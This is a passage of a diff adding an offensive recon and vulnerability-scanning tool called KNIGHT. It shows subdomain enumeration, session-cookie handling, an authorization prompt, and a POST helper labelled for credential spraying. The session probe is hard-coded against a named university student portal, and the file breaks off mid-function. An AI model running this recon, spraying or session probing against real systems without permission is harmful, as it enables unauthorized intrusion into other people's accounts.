@@ -1,0 +1,3568 @@
+#!/usr/bin/env python3
+"""
+KNIGHT v1 - Autonomous Recon & Vulnerability Assessment Framework
+FULLY CORRECTED FINAL VERSION — OFFENSIVE MODULE ENABLED
+
+Fixes applied:
+1. test_auth_bypass: fixed boolean expression
+2. XSS scanner: consistent variable names and correct CANARY injection
+3. DOM XSS detection: MutationObserver now survives navigation (add_init_script)
+4. SQLi injection: _inject_sqli no longer double‑quotes
+5. Open Redirect: renamed _is_valid_redirect → _is_malicious_redirect for clarity
+6. Offensive module re‑enabled (--offensive works)
+
+All other improvements (ResourceManager, rate‑limited post(), thread safety, etc.) are retained.
+
+Pipeline: authorization gate -> Ghost Hunter (recon: subfinder/crt.sh/DNS)
+          -> Crawler (gau/waybackurls -> real parameterized URLs)
+          -> JS Secrets scan -> XSS / SQLi / Open Redirect / IDOR scanners
+          -> Nuclei (CVE/misconfig) -> Brain (custom signatures)
+          -> Offensive Engine (--offensive flag)
+          -> Scribe (dedup, triage, local-LLM narrative, PDF report)
+
+SETUP
+  pip install httpx ollama playwright reportlab
+  playwright install chromium
+  ollama pull llama3
+  cp .env.example .env   (or export the BURAQ_* vars) and fill in your values
+
+RECOMMENDED EXTERNAL TOOLS (optional, but coverage is much better with them):
+  subfinder   https://github.com/projectdiscovery/subfinder
+  gau         https://github.com/lc/gau
+  nuclei      https://github.com/projectdiscovery/nuclei
+
+USAGE
+  python Knight.py example.com
+  python Knight.py example.com --turbo --scope-file scope.txt
+  python Knight.py example.com --offensive
+  python Knight.py example.com \
+      --session-a "Authorization: Bearer TOKEN_A" \
+      --session-b "Authorization: Bearer TOKEN_B" \
+      --endpoint /api/v1/user/{id} --resource-id 12345
+
+You must have explicit authorization to scan any target you point this at.
+The tool will not run without confirming this, and every confirmation is
+logged with a timestamp to scope_confirmations.log.
+
+Every finding except CONFIRMED-tier IDOR is a lead, not proof. Verify
+manually before reporting anything from this tool to a bug bounty program.
+"""
+
+import argparse
+import concurrent.futures
+import datetime
+import fnmatch
+import hashlib
+import html
+import json
+import logging
+import os
+import random
+import re
+import socket
+import signal
+import subprocess
+import sys
+import threading
+import time
+import urllib.parse
+import http.server
+import socketserver
+import atexit
+from pathlib import Path
+from threading import Thread
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
+
+import httpx
+import ollama
+from playwright.sync_api import sync_playwright
+from reportlab.lib import colors
+from reportlab.lib.pagesizes import letter
+from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
+from reportlab.platypus import (Image, PageBreak, Paragraph, SimpleDocTemplate,
+                                 Spacer, Table, TableStyle)
+
+
+# ==============================================================================
+# CONFIG
+# ==============================================================================
+
+# ==============================================================================
+# TARGET NORMALIZATION / SAFE OUTPUT
+# ==============================================================================
+
+def normalize_scan_target(raw_target):
+    """Normalize a CLI target while preserving an explicit HTTP scheme and port."""
+    raw = str(raw_target or "").strip()
+    if not raw:
+        raise ValueError("Target cannot be empty")
+    candidate = raw if "://" in raw else "https://" + raw
+    parsed = urlparse(candidate)
+    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
+        raise ValueError(f"Invalid target: {raw_target}")
+    return urlunparse((
+        parsed.scheme.lower(), parsed.netloc, parsed.path or "",
+        parsed.params, parsed.query, ""
+    )).rstrip("/")
+
+def safe_target_name(target):
+    value = str(target or "target")
+    return re.sub(r"[^A-Za-z0-9._-]+", "_", value).strip("._-") or "target"
+
+def _load_dotenv(path=".env"):
+    if not os.path.exists(path):
+        return
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#") or "=" not in line:
+                continue
+            key, _, val = line.partition("=")
+            os.environ.setdefault(key.strip(), val.strip().strip('"').strip("'"))
+
+_load_dotenv()
+
+LEAD_RESEARCHER = os.environ.get("BURAQ_RESEARCHER", "Rouhan Dar")
+VERSION = "v19.0-FINAL-OFFENSIVE"
+
+DISCORD_WEBHOOK_URL = os.environ.get("BURAQ_DISCORD_WEBHOOK", "")
+
+MAX_THREADS = int(os.environ.get("BURAQ_MAX_THREADS", 10))
+TIME_BASED_THREADS = int(os.environ.get("BURAQ_TIME_BASED_THREADS", 3))
+HTTP_TIMEOUT = float(os.environ.get("BURAQ_HTTP_TIMEOUT", 6.0))
+RATE_LIMIT_DELAY = float(os.environ.get("BURAQ_RATE_LIMIT", 0.15))
+NUCLEI_TIMEOUT = os.environ.get("BURAQ_NUCLEI_TIMEOUT", "4")
+NUCLEI_CONCURRENCY = os.environ.get("BURAQ_NUCLEI_CONCURRENCY", "12")
+NUCLEI_PROCESS_TIMEOUT = float(os.environ.get("BURAQ_NUCLEI_PROCESS_TIMEOUT", "180"))
+
+# Optional authenticated scanning session. Loaded only when explicitly supplied.
+_AUTH_ENABLED = False
+_AUTH_HEADERS: dict[str, str] = {}
+_AUTH_COOKIES: dict[str, str] = {}
+
+
+def _load_auth_session(path: str | None) -> bool:
+    """Load a JSON session exported for an authorized research target.
+
+    Supported format:
+    {
+      "headers": {"Authorization": "Bearer ..."},
+      "cookies": {"session": "...", "csrf": "..."}
+    }
+
+    A list of cookie objects is also accepted under "cookies":
+    [{"name":"session","value":"...","domain":".example.com","path":"/"}]
+    """
+    global _AUTH_ENABLED, _AUTH_HEADERS, _AUTH_COOKIES
+
+    if not path:
+        _AUTH_ENABLED = False
+        _AUTH_HEADERS = {}
+        _AUTH_COOKIES = {}
+        return False
+
+    session_path = Path(path).expanduser()
+    if not session_path.is_file():
+        raise FileNotFoundError(f"Authentication session file not found: {session_path}")
+
+    with session_path.open("r", encoding="utf-8") as f:
+        data = json.load(f)
+
+    if not isinstance(data, dict):
+        raise ValueError("Authentication session must be a JSON object.")
+
+    headers = data.get("headers", {})
+    cookies = data.get("cookies", {})
+
+    if headers is None:
+        headers = {}
+    if cookies is None:
+        cookies = {}
+
+    if not isinstance(headers, dict):
+        raise ValueError("'headers' in auth session must be an object.")
+
+    normalized_headers = {
+        str(k): str(v) for k, v in headers.items()
+        if str(k).strip() and str(v).strip()
+    }
+
+    normalized_cookies: dict[str, str] = {}
+    if isinstance(cookies, dict):
+        normalized_cookies = {
+            str(k): str(v) for k, v in cookies.items()
+            if str(k).strip()
+        }
+    elif isinstance(cookies, list):
+        for item in cookies:
+            if not isinstance(item, dict):
+                continue
+            name = item.get("name")
+            value = item.get("value")
+            if name is not None and value is not None:
+                normalized_cookies[str(name)] = str(value)
+    else:
+        raise ValueError("'cookies' in auth session must be an object or list.")
+
+    _AUTH_HEADERS = normalized_headers
+    _AUTH_COOKIES = normalized_cookies
+    _AUTH_ENABLED = bool(_AUTH_HEADERS or _AUTH_COOKIES)
+
+    log_net.info(
+        "Authenticated session loaded: headers=%d cookies=%d enabled=%s",
+        len(_AUTH_HEADERS), len(_AUTH_COOKIES), _AUTH_ENABLED
+    )
+    return _AUTH_ENABLED
+
+
+def _merged_headers(headers: dict | None) -> dict[str, str]:
+    """Merge authenticated headers with per-request headers."""
+    merged = dict(_AUTH_HEADERS)
+    if headers:
+        merged.update({str(k): str(v) for k, v in headers.items()})
+    return merged
+
+
+
+def _response_looks_unauthenticated(resp: httpx.Response | None) -> bool:
+    """Conservative check for common login/unauthorized responses."""
+    if resp is None:
+        return True
+    if resp.status_code in {401, 403}:
+        return True
+    body = (resp.text or "").lower()
+    markers = (
+        "sign in", "signin", "login", "log in",
+        "username", "password", "authentication required"
+    )
+    return any(marker in body for marker in markers)
+
+
+
+
+
+
+def _auth_probe(
+    url: str,
+    authenticated: bool,
+    method: str = "GET",
+) -> httpx.Response | None:
+    """Perform a browser-like authentication probe request."""
+    headers = {
+        "Accept": "*/*",
+        "User-Agent": "KNIGHT-Research/21",
+    }
+    cookies = None
+
+    parsed = urlparse(url)
+    origin = f"{parsed.scheme}://{parsed.netloc}"
+
+    if method.upper() == "POST":
+        headers.update({
+            "Content-Type": "application/json; charset=utf-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": origin,
+            "Referer": f"{origin}/lpuums/StudentDashboard.aspx",
+        })
+
+    if authenticated:
+        headers = _merged_headers(headers)
+        cookies = _AUTH_COOKIES or None
+
+    if method.upper() == "POST":
+        return httpx.post(
+            url,
+            content=b"",
+            timeout=HTTP_TIMEOUT,
+            verify=False,
+            headers=headers,
+            cookies=cookies,
+            follow_redirects=True,
+        )
+
+    return httpx.get(
+        url,
+        timeout=HTTP_TIMEOUT,
+        verify=False,
+        headers=headers,
+        cookies=cookies,
+        follow_redirects=True,
+    )
+
+def _response_login_signature(resp: httpx.Response | None) -> dict:
+    """Build a coarse, non-sensitive signature for auth comparison."""
+    if resp is None:
+        return {
+            "status": None,
+            "final_url": "",
+            "length": 0,
+            "login_like": True,
+            "content_type": "",
+        }
+
+    body = resp.text or ""
+    low = body.lower()
+    login_terms = (
+        "sign in", "signin", "login", "log in",
+        "username", "password", "authentication required"
+    )
+
+    return {
+        "status": resp.status_code,
+        "final_url": str(getattr(resp, "url", "")),
+        "length": len(body),
+        "login_like": resp.status_code in {401, 403} or any(
+            term in low for term in login_terms
+        ),
+        "content_type": resp.headers.get("content-type", ""),
+    }
+
+
+def _student_specific_difference(
+    anonymous: httpx.Response | None,
+    authenticated: httpx.Response | None,
+) -> tuple[bool, str]:
+    """Look for meaningful evidence that the authenticated response differs."""
+    if anonymous is None or authenticated is None:
+        return False, "one or both responses were unavailable"
+
+    a = anonymous.text or ""
+    b = authenticated.text or ""
+
+    asig = _response_login_signature(anonymous)
+    bsig = _response_login_signature(authenticated)
+
+    if asig["login_like"] and not bsig["login_like"]:
+        return True, "anonymous response looked unauthenticated while authenticated response did not"
+
+    if asig["status"] != bsig["status"] and not bsig["login_like"]:
+        return True, f"HTTP status changed {asig['status']} -> {bsig['status']}"
+
+    # For account-specific endpoints, a substantial response change is useful
+    # evidence, but not absolute proof on its own.
+    if abs(len(b) - len(a)) >= 500:
+        return True, f"response size changed {len(a)} -> {len(b)} bytes"
+
+    if asig["final_url"] != bsig["final_url"] and not bsig["login_like"]:
+        return True, "final URL changed between anonymous and authenticated requests"
+
+    try:
+        aj = anonymous.json()
+        bj = authenticated.json()
+        if isinstance(aj, dict) and isinstance(bj, dict):
+            shared = set(aj).intersection(bj)
+            changed = [k for k in shared if aj.get(k) != bj.get(k)]
+            new_keys = set(bj) - set(aj)
+            if changed or new_keys:
+                return True, "authenticated JSON response contains changed/new fields"
+    except Exception:
+        pass
+
+    return False, "no sufficiently strong authenticated-vs-anonymous difference"
+
+
+
+def _safe_response_fingerprint(resp: httpx.Response | None) -> dict:
+    """Return non-sensitive metadata used to compare two responses."""
+    if resp is None:
+        return {
+            "status": None,
+            "final_url": "",
+            "length": 0,
+            "content_type": "",
+            "json_keys": (),
+            "text_hash": "",
+        }
+
+    body = resp.text or ""
+    keys = ()
+
+    try:
+        data = resp.json()
+        if isinstance(data, dict):
+            keys = tuple(sorted(str(k) for k in data.keys()))
+            # ASP.NET PageMethods often wrap the payload in a `d` property.
+            if isinstance(data.get("d"), (dict, list, str, int, float, bool)):
+                if isinstance(data["d"], dict):
+                    keys = tuple(sorted(str(k) for k in data["d"].keys()))
+    except Exception:
+        pass
+
+    return {
+        "status": resp.status_code,
+        "final_url": str(getattr(resp, "url", "")),
+        "length": len(body),
+        "content_type": resp.headers.get("content-type", ""),
+        "json_keys": keys,
+        "text_hash": hashlib.sha256(body.encode("utf-8", "replace")).hexdigest(),
+    }
+
+
+def _ums_auth_probe_score(
+    anonymous: httpx.Response | None,
+    authenticated: httpx.Response | None,
+) -> tuple[str, str]:
+    """
+    Classify the session conservatively.
+
+    200/200 with identical responses is INCONCLUSIVE, not NOT AUTHENTICATED,
+    because some UMS endpoints can return a generic 200 response.
+    """
+    if anonymous is None or authenticated is None:
+        return "INCONCLUSIVE", "one or both probe requests failed"
+
+    a = _safe_response_fingerprint(anonymous)
+    b = _safe_response_fingerprint(authenticated)
+
+    if a["status"] in {401, 403} and b["status"] not in {401, 403}:
+        return "AUTHENTICATED", "authenticated request escaped anonymous authorization response"
+
+    login_terms = (
+        "login", "sign in", "signin", "password",
+        "authentication required", "unauthorized"
+    )
+    a_body = (anonymous.text or "").lower()
+    b_body = (authenticated.text or "")
+    b_low = b_body.lower()
+
+    a_login = a["status"] in {401, 403} or any(t in a_body for t in login_terms)
+    b_login = b["status"] in {401, 403} or any(t in b_low for t in login_terms)
+
+    if a_login and not b_login:
+        return "AUTHENTICATED", "anonymous response looks unauthenticated while session response does not"
+
+    # An explicit response difference is evidence, but not absolute proof.
+    size_delta = abs(b["length"] - a["length"])
+    keys_changed = a["json_keys"] != b["json_keys"]
+
+    if keys_changed and size_delta >= 100:
+        return "LIKELY AUTHENTICATED", "authenticated response has different JSON structure and size"
+
+    if size_delta >= 1000:
+        return "LIKELY AUTHENTICATED", f"response size changed substantially ({a['length']} -> {b['length']} bytes)"
+
+    if a["final_url"] != b["final_url"]:
+        return "LIKELY AUTHENTICATED", "authenticated request resolved to a different final URL"
+
+    if a["text_hash"] != b["text_hash"]:
+        return "INCONCLUSIVE", "responses differ but there is not enough evidence to establish authentication"
+
+    return "INCONCLUSIVE", "anonymous and authenticated responses are identical"
+
+def verify_authenticated_session(
+    target: str,
+    check_url: str | None = None,
+    marker: str | None = None,
+) -> dict:
+    """
+    Verify the supplied session against a protected, account-specific endpoint.
+
+    For ums.lpu.in the default probe is StudentAttendanceSummary and the
+    default signal is "* Aggregate Attendance". The actual response body
+    is never logged or included in the result.
+    """
+    global _AUTH_HEADERS, _AUTH_COOKIES
+
+    is_ums = target.lower().rstrip(".") == "ums.lpu.in"
+
+    url = check_url or (
+        f"https://{target}/lpuums/StudentDashboard.aspx/StudentAttendanceSummary"
+        if is_ums
+        else f"https://{target}"
+    )
+
+    method = "POST" if (
+        is_ums and
+        urlparse(url).path.lower().endswith(
+            "/studentdashboard.aspx/studentattendancesummary"
+        )
+    ) else "GET"
+
+    effective_marker = marker if marker is not None else (
+        "* Aggregate Attendance" if is_ums else None
+    )
+
+    saved_headers = dict(_AUTH_HEADERS)
+    saved_cookies = dict(_AUTH_COOKIES)
+
+    try:
+        anonymous = _auth_probe(url, authenticated=False, method=method)
+        authenticated = _auth_probe(url, authenticated=True, method=method)
+
+        anonymous_body = anonymous.text if anonymous else ""
+        authenticated_body = authenticated.text if authenticated else ""
+
+        marker_found = bool(
+            effective_marker
+            and effective_marker.lower() in authenticated_body.lower()
+            and effective_marker.lower() not in anonymous_body.lower()
+        )
+
+        if marker_found:
+            status = "AUTHENTICATED"
+            reason = "authenticated-only attendance marker detected"
+        else:
+            status, reason = _ums_auth_probe_score(
+                anonymous,
+                authenticated,
+            )
+
+        a = _safe_response_fingerprint(anonymous)
+        b = _safe_response_fingerprint(authenticated)
+
+        logger = (
+            log_net.info
+            if status in {"AUTHENTICATED", "LIKELY AUTHENTICATED"}
+            else log_net.warning
+        )
+        logger(
+            "AUTH CHECK: %s — method=%s anonymous=%s/%dB authenticated=%s/%dB — %s",
+            status,
+            method,
+            a["status"],
+            a["length"],
+            b["status"],
+            b["length"],
+            reason,
+        )
+
+        return {
+            "url": url,
+            "method": method,
+            "status": status,
+            "passed": status in {"AUTHENTICATED", "LIKELY AUTHENTICATED"},
+            "reason": reason,
+            "anonymous_status": a["status"],
+            "authenticated_status": b["status"],
+            "anonymous_length": a["length"],
+            "authenticated_length": b["length"],
+            "anonymous_hash": a["text_hash"],
+            "authenticated_hash": b["text_hash"],
+        }
+
+    except Exception as exc:
+        log_net.warning("AUTH CHECK: FAILED — %s", exc)
+        return {
+            "url": url,
+            "method": method,
+            "status": "ERROR",
+            "passed": False,
+            "error": str(exc),
+        }
+    finally:
+        _AUTH_HEADERS = saved_headers
+        _AUTH_COOKIES = saved_cookies
+
+def _cookie_header() -> str:
+    """Serialize the loaded cookie jar for tools that only accept headers."""
+    return "; ".join(f"{k}={v}" for k, v in _AUTH_COOKIES.items())
+
+
+def _playwright_auth_cookies() -> list[dict]:
+    """Convert the simple cookie jar into Playwright-compatible cookies."""
+    return [
+        {"name": name, "value": value, "url": f"https://{target_domain}"}
+        for name, value in _AUTH_COOKIES.items()
+        for target_domain in [AUTH_COOKIE_DOMAIN or "localhost"]
+    ]
+
+
+AUTH_COOKIE_DOMAIN = os.environ.get("KNIGHT_AUTH_COOKIE_DOMAIN", "")
+
+
+SLEEP_SECONDS = 5
+TIME_TRIALS = 5
+TIME_TOLERANCE = 1.25
+TIME_MIN_SEPARATION = 2.5
+
+BASE_DIR = Path(__file__).resolve().parent
+EVIDENCE_DIR = BASE_DIR / "evidence"
+LOG_DIR = BASE_DIR / "logs"
+VULN_DB_PATH = BASE_DIR / "vuln_db.json"
+SCOPE_LOG_PATH = BASE_DIR / "scope_confirmations.log"
+
+EVIDENCE_DIR.mkdir(exist_ok=True)
+LOG_DIR.mkdir(exist_ok=True)
+
+def get_logger(name="Knight"):
+    logger = logging.getLogger(name)
+    if logger.handlers:
+        return logger
+    logger.setLevel(logging.DEBUG)
+    fmt = logging.Formatter("%(asctime)s [%(levelname)s] %(name)s: %(message)s", "%H:%M:%S")
+    fh = logging.FileHandler(LOG_DIR / "Knight.log")
+    fh.setLevel(logging.DEBUG)
+    fh.setFormatter(fmt)
+    ch = logging.StreamHandler(sys.stdout)
+    ch.setLevel(logging.INFO)
+    ch.setFormatter(fmt)
+    logger.addHandler(fh)
+    logger.addHandler(ch)
+    return logger
+
+
+# ==============================================================================
+# RESOURCE MANAGER
+# ==============================================================================
+
+log_resource = get_logger("resource")
+
+class ResourceManager:
+    _processes = []
+    _sockets = []
+    _cleanup_registered = False
+
+    @classmethod
+    def register_process(cls, proc):
+        cls._processes.append(proc)
+        if not cls._cleanup_registered:
+            atexit.register(cls.cleanup_all)
+            signal.signal(signal.SIGINT, cls.signal_handler)
+            cls._cleanup_registered = True
+
+    @classmethod
+    def register_socket(cls, sock):
+        cls._sockets.append(sock)
+
+    @classmethod
+    def cleanup_all(cls):
+        for proc in cls._processes:
+            try:
+                if proc.poll() is None:
+                    proc.terminate()
+                    proc.wait(timeout=2)
+            except:
+                pass
+        for sock in cls._sockets:
+            try:
+                sock.close()
+            except:
+                pass
+        cls._processes.clear()
+        cls._sockets.clear()
+        log_resource.info("Resource cleanup complete")
+
+    @classmethod
+    def signal_handler(cls, signum, frame):
+        log_resource.info("Received interrupt signal, cleaning up...")
+        cls.cleanup_all()
+        sys.exit(0)
+
+
+# ==============================================================================
+# AUTHORIZATION & SCOPE
+# ==============================================================================
+
+log_auth = get_logger("auth")
+
+def require_authorization(target: str) -> bool:
+    print(f"\n\033[93m[!] AUTHORIZATION REQUIRED\033[0m")
+    print(f"    Target: {target}")
+    print("    You must have explicit written permission to scan this target")
+    print("    (ownership, an active bug bounty program in scope, or a signed")
+    print("    engagement letter). Unauthorized scanning may be illegal.\n")
+    resp = input(f"    Type the target domain to confirm authorization ('{target}'): ").strip()
+    if resp != target:
+        log_auth.warning(f"Authorization NOT confirmed for {target} (mismatch input: '{resp}')")
+        print("\033[91m[✘] Confirmation did not match target. Aborting.\033[0m")
+        return False
+    with open(SCOPE_LOG_PATH, "a") as f:
+        f.write(f"{datetime.datetime.now().isoformat()} | AUTHORIZED | {target}\n")
+    log_auth.info(f"Authorization confirmed for {target}")
+    print("\033[92m[✔] Authorization confirmed and logged.\033[0m\n")
+    return True
+
+log_scope = get_logger("scope")
+
+def load_scope(scope_file: str | None):
+    include, exclude = [], []
+    if not scope_file:
+        return include, exclude
+    with open(scope_file) as f:
+        for line in f:
+            line = line.strip()
+            if not line or line.startswith("#"):
+                continue
+            if line.startswith("!"):
+                exclude.append(line[1:].strip())
+            else:
+                include.append(line)
+    log_scope.info(f"Scope loaded: {len(include)} include pattern(s), {len(exclude)} exclude pattern(s)")
+    return include, exclude
+
+def in_scope(host: str, include: list[str], exclude: list[str]) -> bool:
+    if exclude and any(fnmatch.fnmatch(host, pat) for pat in exclude):
+        return False
+    if not include:
+        return True
+    return any(fnmatch.fnmatch(host, pat) for pat in include)
+
+def filter_hosts(hosts: list[str], include: list[str], exclude: list[str]) -> list[str]:
+    kept = [h for h in hosts if in_scope(h, include, exclude)]
+    dropped = len(hosts) - len(kept)
+    if dropped:
+        log_scope.info(f"Scope filter dropped {dropped} out-of-scope host(s)")
+    return kept
+
+
+# ==============================================================================
+# HTTP HELPERS (GET + POST with rate limiting)
+# ==============================================================================
+
+log_net = get_logger("net")
+
+def get(url: str, headers: dict = None, max_retries: int = 3) -> httpx.Response | None:
+    delay = RATE_LIMIT_DELAY
+    for attempt in range(max_retries):
+        try:
+            time.sleep(delay)
+            request_kwargs = {
+                "timeout": HTTP_TIMEOUT,
+                "verify": False,
+                "headers": _merged_headers(headers),
+                "cookies": (_AUTH_COOKIES if not headers else None),
+                "follow_redirects": False,
+            }
+            # If KNIGHT_HTTP_PROXY/KNIGHT_HTTPS_PROXY is explicitly configured,
+            # httpx will use it. Otherwise avoid accidental inherited shell
+            # proxy settings interfering with direct target scanning.
+            if not (os.environ.get("KNIGHT_HTTP_PROXY") or
+                    os.environ.get("KNIGHT_HTTPS_PROXY")):
+                request_kwargs["trust_env"] = False
+            r = httpx.get(url, **request_kwargs)
+            if r.status_code == 429:
+                retry_after = r.headers.get("Retry-After")
+                wait = float(retry_after) if retry_after else delay * 4
+                log_net.warning(f"429 rate-limited on {url}, backing off {wait:.1f}s")
+                time.sleep(wait)
+                delay *= 2
+                continue
+            return r
+        except Exception as e:
+            log_net.debug(f"Request failed ({attempt + 1}/{max_retries}) for {url}: {e}")
+            time.sleep(delay)
+            delay *= 2
+    return None
+
+def get_following_redirects(url: str, headers: dict = None, max_retries: int = 3) -> httpx.Response | None:
+    delay = RATE_LIMIT_DELAY
+    for attempt in range(max_retries):
+        try:
+            time.sleep(delay)
+            return httpx.get(
+                url, timeout=HTTP_TIMEOUT, verify=False,
+                headers=_merged_headers(headers),
+                cookies=(_AUTH_COOKIES if not headers else None),
+                follow_redirects=True
+            )
+        except Exception as e:
+            log_net.debug(f"Request failed ({attempt + 1}/{max_retries}) for {url}: {e}")
+            time.sleep(delay)
+            delay *= 2
+    return None
+
+def post(url: str, data: dict, headers: dict = None, max_retries: int = 3) -> httpx.Response | None:
+    """Rate‑limited POST with 429 backoff – use for credential spraying."""
+    delay = RATE_LIMIT_DELAY
+    for attempt in range(max_retries):
+        try:
+            time.sleep(delay)
+            r = httpx.post(url, data=data, timeout=HTTP_TIMEOUT, verify=False,
+                           headers=_merged_headers(headers),
+                           cookies=(_AUTH_COOKIES if not headers else None),
+                           follow_redirects=False)
+            if r.status_code == 429:
+                retry_after = r.headers.get("Retry-After")
+                wait = float(retry_after) if retry_after else delay * 4
+                log_net.warning(f"429 rate-limited on {url}, backing off {wait:.1f}s")
+                time.sleep(wait)
+                delay *= 2
+                continue
+            return r
+        except Exception as e:
+            log_net.debug(f"POST failed ({attempt + 1}/{max_retries}) for {url}: {e}")
+            time.sleep(delay)
+            delay *= 2
+    return None
+
+
+# ==============================================================================
+# GHOST HUNTER (RECON) with non-blocking subprocess
+# ==============================================================================
+
+log_ghost_hunter = get_logger("ghost_hunter")
+
+DEFAULT_WORDLIST = [
+    "dev", "api", "admin", "vpn", "mail", "portal", "test", "db", "staging",
+    "internal", "ums", "lms", "sandbox", "beta", "uat", "qa", "demo",
+    "backend", "gateway", "auth", "sso", "app", "app1", "app2", "ci", "jenkins",
+    "grafana", "kibana", "monitor", "status", "support", "docs", "cdn",
+    "static", "assets", "media", "img", "images", "files", "upload", "uploads",
+    "ftp", "sftp", "ssh", "remote", "vpn2", "mfa", "login", "signin", "signup",
+    "register", "account", "accounts", "billing", "payments", "pay", "checkout",
+    "shop", "store", "cart", "www2", "old", "legacy", "v1", "v2", "v3",
+    "prod", "production", "preprod", "pre-prod", "int", "integration",
+    "partner", "partners", "vendor", "vendors", "client", "clients",
+    "mobile", "m", "wap", "webmail", "email", "smtp", "pop", "imap",
+    "ns1", "ns2", "dns", "proxy", "cache", "redis", "db1", "db2", "sql",
+    "mysql", "postgres", "mongo", "es", "elastic", "kafka", "queue",
+    "jira", "confluence", "gitlab", "git", "svn", "bitbucket", "artifactory",
+    "nexus", "sonar", "wiki", "kb", "help", "faq", "blog", "news", "press",
+    "careers", "jobs", "hr", "intranet", "extranet", "secure", "ssl",
+]
+
+def _run_tool_nonblocking(cmd: list[str], timeout: int = 90) -> list[str] | None:
+    try:
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        ResourceManager.register_process(proc)
+        try:
+            stdout, stderr = proc.communicate(timeout=timeout)
+            if stdout.strip():
+                return [l.strip() for l in stdout.splitlines() if l.strip()]
+            return []
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            stdout, stderr = proc.communicate()
+            log_ghost_hunter.warning(f"{cmd[0]} timed out after {timeout}s")
+            return []
+        finally:
+            if proc in ResourceManager._processes:
+                ResourceManager._processes.remove(proc)
+    except FileNotFoundError:
+        return None
+    except Exception as e:
+        log_ghost_hunter.warning(f"{cmd[0]} failed: {e}")
+        return []
+
+def _run_tool(cmd: list[str], timeout: int = 90) -> list[str] | None:
+    return _run_tool_nonblocking(cmd, timeout)
+
+def _subfinder(domain: str) -> set[str] | None:
+    result = _run_tool(["subfinder", "-d", domain, "-silent"])
+    if result is None:
+        log_ghost_hunter.info("subfinder not found on PATH — falling back to crt.sh + DNS brute-force only.")
+        return None
+    log_ghost_hunter.info(f"subfinder found {len(result)} subdomain(s)")
+    return set(result)
+
+def _cert_transparency_lookup(domain: str) -> set[str]:
+    found = set()
+    try:
+        r = httpx.get(f"https://crt.sh/?q=%25.{domain}&output=json", timeout=HTTP_TIMEOUT * 2)
+        if r.status_code == 200 and r.text.strip():
+            for entry in r.json():
+                name = entry.get("name_value", "")
+                for line in name.split("\n"):
+                    line = line.strip().lower()
+                    if line.endswith(domain) and "*" not in line:
+                        found.add(line)
+    except Exception as e:
+        log_ghost_hunter.warning(f"crt.sh lookup failed (non-fatal): {e}")
+    return found
+
+def _dns_brute_force(domain: str, wordlist: list[str]) -> set[str]:
+    found = set()
+    def check(word):
+        candidate = f"{word}.{domain}"
+        try:
+            socket.gethostbyname(candidate)
+            return candidate
+        except socket.error:
+            return None
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futures = [ex.submit(check, w) for w in wordlist]
+        for fut in concurrent.futures.as_completed(futures):
+            res = fut.result()
+            if res:
+                found.add(res)
+    return found
+
+def _confirm_alive(hosts: set[str]) -> list[dict]:
+    """Confirm reachability and report concrete probe failures."""
+    alive = []
+    def probe(host):
+        errors = []
+        if "://" in host:
+            parsed = urlparse(host)
+            schemes = (parsed.scheme,)
+            host_value = parsed.netloc
+        else:
+            schemes = ("https", "http")
+            host_value = host
+        for scheme in schemes:
+            url = f"{scheme}://{host_value}"
+            try:
+                r = httpx.get(url, timeout=HTTP_TIMEOUT, verify=False,
+                              follow_redirects=True,
+                              headers={"User-Agent": "KNIGHT-Research/20"})
+                return {"host": host, "scheme": scheme, "status": r.status_code,
+                        "url": str(r.url), "errors": errors}
+            except httpx.ConnectTimeout as exc:
+                errors.append(f"{scheme}: ConnectTimeout: {exc}")
+            except httpx.ReadTimeout as exc:
+                errors.append(f"{scheme}: ReadTimeout: {exc}")
+            except httpx.ConnectError as exc:
+                errors.append(f"{scheme}: ConnectError: {exc}")
+                try:
+                    r = httpx.get(
+                        url,
+                        timeout=HTTP_TIMEOUT,
+                        verify=False,
+                        follow_redirects=True,
+                        headers={"User-Agent": "KNIGHT-Research/20"},
+                        trust_env=False,
+                    )
+                    errors.append(f"{scheme}: direct connection succeeded")
+                    return {
+                        "host": host,
+                        "scheme": scheme,
+                        "status": r.status_code,
+                        "url": str(r.url),
+                        "errors": errors,
+                    }
+                except httpx.HTTPError as direct_exc:
+                    errors.append(
+                        f"{scheme}: direct connection failed: "
+                        f"{type(direct_exc).__name__}: {direct_exc}"
+                    )
+            except httpx.HTTPError as exc:
+                errors.append(f"{scheme}: {type(exc).__name__}: {exc}")
+            except Exception as exc:
+                errors.append(f"{scheme}: {type(exc).__name__}: {exc}")
+        return {"host": host, "errors": errors}
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futures = [ex.submit(probe, h) for h in hosts]
+        for fut in concurrent.futures.as_completed(futures):
+            res = fut.result()
+            if res.get("status") is not None:
+                alive.append(res)
+                log_ghost_hunter.info(f"Alive: {res['url']} [{res['status']}]")
+            else:
+                for error in res.get("errors", []):
+                    log_ghost_hunter.warning(f"Probe failed for {res['host']}: {error}")
+    return alive
+
+
+def _hostname_in_scope(hostname: str, domain: str) -> bool:
+    """Match a hostname against a hostname, host:port, or full HTTP(S) target."""
+    host = (hostname or "").strip().rstrip(".").lower()
+    raw = str(domain or "").strip()
+    if not host or not raw:
+        return False
+
+    candidate = raw if "://" in raw else f"https://{raw}"
+    try:
+        root = (urlparse(candidate).hostname or "").strip().rstrip(".").lower()
+    except Exception:
+        root = raw.split("/", 1)[0].split(":", 1)[0].strip().rstrip(".").lower()
+
+    return bool(root and (host == root or host.endswith("." + root)))
+
+def ghost_hunter(domain: str, wordlist: list[str] = None,
+                  scope_include: list[str] = None, scope_exclude: list[str] = None) -> list[dict]:
+    """Recon a hostname/host:port, while accepting a full HTTP(S) URL."""
+    wordlist = wordlist or DEFAULT_WORDLIST
+    scope_include = scope_include or []
+    scope_exclude = scope_exclude or []
+    parsed_target = urlparse(domain if "://" in domain else f"https://{domain}")
+    target_host = parsed_target.hostname or parsed_target.netloc
+    target_hostport = parsed_target.netloc or target_host
+    if not target_host:
+        raise ValueError(f"Invalid recon target: {domain}")
+    log_ghost_hunter.info(f"Ghost Hunter engaging on {domain}")
+    candidates = {target_hostport}
